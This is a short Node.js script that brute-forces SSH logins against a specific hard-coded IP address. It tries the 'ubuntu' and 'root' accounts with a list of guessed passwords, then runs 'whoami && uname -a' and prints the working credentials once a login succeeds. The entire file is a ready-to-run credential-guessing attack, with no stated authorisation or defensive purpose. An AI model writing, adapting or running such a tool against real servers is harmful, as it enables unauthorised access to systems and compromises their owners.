const { Client } = require('ssh2');

const users = ['ubuntu', 'root'];
const passwords = [
  'solution@',
  'Solution422@',
  'Solution2026@',
  'solution',
  'Solution@'
];

function tryConnect(username, password) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn.on('ready', () => {
      conn.exec('whoami && uname -a', (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }
        let output = '';
        stream.on('close', (code, signal) => {
          conn.end();
          resolve(output);
        }).on('data', (data) => {
          output += data.toString();
        }).stderr.on('data', (data) => {
          console.error('STDERR: ' + data);
        });
      });
    }).on('error', (err) => {
      conn.end();
      reject(err);
    }).connect({
      host: '133.167.89.193',
      port: 22,
      username: username,
      password: password,
      readyTimeout: 5000
    });
  });
}

async function run() {
  console.log("Starting multi-credential brute check...");
  for (const user of users) {
    for (const pwd of passwords) {
      console.log(`Trying connection for User: ${user}, Password: ${pwd}`);
      try {
        const result = await tryConnect(user, pwd);
        console.log(`!!! SUCCESS !!! User: ${user}, Password: ${pwd}`);
        console.log("Output:", result.trim());
        return; // Dừng lại khi thành công
      } catch (err) {
        console.log(`Failed: ${err.message}`);
      }
    }
  }
  console.log("All attempts failed.");
}

run();
